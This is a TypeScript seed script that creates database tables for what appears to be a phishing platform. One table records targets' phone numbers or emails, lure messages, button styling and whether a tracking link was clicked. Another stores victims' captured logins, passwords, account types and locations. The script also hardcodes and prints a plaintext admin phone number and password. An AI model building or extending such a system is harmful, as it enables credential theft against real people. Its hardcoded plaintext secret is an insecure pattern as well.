import { neon } from "@neondatabase/serverless";
import { readFileSync } from "fs";
import { resolve } from "path";

// Load .env.local manually
const envPath = resolve(process.cwd(), ".env.local");
const envLines = readFileSync(envPath, "utf-8").split("\n");
for (const line of envLines) {
  const [key, ...rest] = line.split("=");
  if (key && rest.length) process.env[key.trim()] = rest.join("=").trim();
}

const sql = neon(process.env.DATABASE_URL!);

async function seed() {
  // Create tables if they don't exist yet
  await sql(`
    CREATE TABLE IF NOT EXISTS sqli_admin (
      id INTEGER PRIMARY KEY,
      login_number TEXT NOT NULL,
      gender VARCHAR(20) NOT NULL DEFAULT 'male',
      login_password TEXT NOT NULL
    )
  `);

  await sql(`
    CREATE TABLE IF NOT EXISTS sqli_login_date (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      log_in_date TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);

  await sql(`
    CREATE TABLE IF NOT EXISTS cyber_attacks (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      sender_id UUID NOT NULL,
      target_phone VARCHAR(30) DEFAULT 'unset',
      target_email TEXT DEFAULT 'unset',
      attack_type VARCHAR(100) NOT NULL,
      email_subject TEXT DEFAULT 'unset',
      message TEXT NOT NULL,
      button_name TEXT NOT NULL,
      button_color TEXT NOT NULL,
      response_status TEXT DEFAULT 'Link not clicked',
      status_info TEXT DEFAULT 'Target has not yet clicked on the link',
      link_id VARCHAR(64) NOT NULL UNIQUE,
      link_url TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);

  await sql(`
    CREATE TABLE IF NOT EXISTS cyber_hacked (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      receiver_id UUID NOT NULL,
      name TEXT DEFAULT '',
      phone_or_email TEXT NOT NULL,
      password TEXT NOT NULL,
      account_type VARCHAR(100) NOT NULL,
      location TEXT DEFAULT '',
      link_id VARCHAR(64) NOT NULL,
      seen BOOLEAN DEFAULT FALSE,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);

  // Upsert the sqli_admin seed row
  await sql(`
    INSERT INTO sqli_admin (id, login_number, gender, login_password)
    VALUES (1, '0962464552', 'male', '#Chandamark1')
    ON CONFLICT (id) DO UPDATE
      SET login_number = EXCLUDED.login_number,
          gender = EXCLUDED.gender,
          login_password = EXCLUDED.login_password
  `);

  console.log("✓ sqli_admin seeded: id=1, number=0962464552, gender=male, password=#Chandamark1");
  console.log("✓ All cyber tables created.");
}

seed().catch(console.error);
